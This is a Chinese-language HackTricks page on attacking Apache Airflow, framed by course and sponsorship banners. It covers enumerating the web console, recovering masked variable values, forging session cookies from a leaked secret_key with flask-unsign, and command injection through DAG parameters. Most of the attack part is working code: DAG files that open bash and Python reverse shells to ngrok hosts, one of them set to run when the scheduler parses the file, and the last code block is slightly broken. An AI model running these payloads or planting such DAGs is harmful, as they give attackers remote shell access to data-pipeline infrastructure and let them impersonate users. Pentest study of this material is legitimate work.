# Apache Airflow安全性

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

[**Apache Airflow**](https://airflow.apache.org) 用作**编排和调度数据管道或工作流**的平台。在数据管道的上下文中，“编排”一词表示安排、协调和管理来自各种来源的复杂数据工作流程的过程。这些经过编排的数据管道的主要目的是提供经过处理和可消费的数据集。这些数据集被广泛应用于各种应用程序，包括但不限于商业智能工具、数据科学和机器学习模型，所有这些都是大数据应用程序运行的基础。

基本上，Apache Airflow将允许您在**发生某事**（事件、cron）**时调度代码的执行**。

## 本地实验室

### Docker-Compose

您可以使用来自[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)的**docker-compose配置文件**启动完整的Apache Airflow Docker环境。（如果您使用的是MacOS，请确保为Docker VM分配至少6GB的RAM）。

### Minikube

运行Apache Airflow的一种简单方法是使用**minikube**运行它：
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow配置

Airflow可能会在其配置中存储**敏感信息**，或者您可能会发现存在弱配置：

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

在开始攻击Airflow之前，您应该了解**权限如何工作**：

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 攻击

### Web控制台枚举

如果您可以访问**Web控制台**，您可能能够访问以下一些或所有信息：

* **变量**（自定义敏感信息可能存储在此处）
* **连接**（自定义敏感信息可能存储在此处）
* 在`http://<airflow>/connection/list/`中访问它们
* [**配置**](./#airflow-configuration)（敏感信息如**`secret_key`**和密码可能存储在此处）
* 列出**用户和角色**
* 每个DAG的**代码**（可能包含有趣的信息）

### 检索变量值

变量可以存储在Airflow中，以便**DAG**可以**访问**它们的值。这类似于其他平台的秘密。如果您有**足够的权限**，可以在GUI中访问它们`http://<airflow>/variable/list/`。\
默认情况下，Airflow将在GUI中显示变量的值，但是根据[**此**](https://marclamberti.com/blog/variables-with-apache-airflow/)，可以设置一个**变量列表**，其**值**将显示为**星号**在**GUI**中。

![](<../../.gitbook/assets/image (164).png>)

然而，这些**值**仍然可以通过**CLI**（需要访问DB）、**任意DAG**执行、**API**访问变量端点（需要激活API）甚至**GUI本身**来**检索**。\
要从GUI中访问这些值，只需**选择**要访问的变量，然后单击**操作 -> 导出**。\
另一种方法是通过**搜索过滤**执行**暴力破解**以获取**隐藏值**：

![](<../../.gitbook/assets/image (152).png>)

### 特权升级

如果**`expose_config`**配置设置为**True**，从**用户角色**及以上可以在**Web中读取**配置。在此配置中，会显示**`secret_key`**，这意味着任何具有此有效密钥的用户都可以**创建自己的已签名cookie以冒充任何其他用户帐户**。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG后门（在Airflow worker中执行远程代码执行）

如果您对保存DAG的位置具有**写入访问权限**，您可以**创建一个DAG**，该DAG将向您发送一个**反向 shell**。\
请注意，此反向 shell 将在**airflow worker容器**中执行：
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG后门（Airflow调度器中的RCE）

如果您将某些内容设置为在**代码的根目录中执行**，在撰写本文时，它将在将其放入DAG文件夹后的几秒钟后由调度器**执行**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG创建

如果您设法**入侵DAG集群内的一台机器**，您可以在`dags/`文件夹中创建新的**DAG脚本**，它们将被**复制到DAG集群中的其他机器**。

### DAG代码注入

当您从GUI执行DAG时，可以向其**传递参数**。\
因此，如果DAG编写不当，可能会**容易受到命令注入攻击**。\
这就是在此CVE中发生的情况：[https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

您需要了解的一切，以**开始查找DAG中的命令注入**，就是**参数**是通过代码**`dag_run.conf.get("param_name")`**进行**访问**的。

此外，相同的漏洞可能会出现在**变量**中（请注意，如果具有足够的权限，您可以在GUI中**控制变量的值**）。变量是通过以下方式**访问**的：
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
如果它们例如被用在一个bash命令中，你可以执行命令注入。

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想看到你的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
